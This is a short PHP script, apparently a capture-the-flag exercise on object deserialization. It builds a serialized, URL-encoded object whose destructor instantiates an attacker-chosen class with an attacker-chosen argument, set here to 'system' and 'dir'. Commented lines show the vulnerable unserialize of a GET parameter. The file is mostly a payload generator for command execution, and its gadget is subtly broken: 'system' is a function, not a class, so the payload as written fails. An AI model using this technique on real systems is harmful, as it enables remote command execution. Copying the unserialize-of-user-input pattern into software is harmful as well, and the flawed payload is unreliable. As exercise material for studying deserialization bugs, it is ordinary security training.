<?php
highlight_file(__FILE__);

class A
{
    public $a;
    public $b;

    public function __destruct()
    {
        echo new $this->a($this->b);
    }
}

$yj=new A();
$yj->a="system";
$yj->b="dir";
echo(urlencode(serialize($yj)));

// $newnew = unserialize($_GET['newnew']);
// throw new Exception('can can need new new');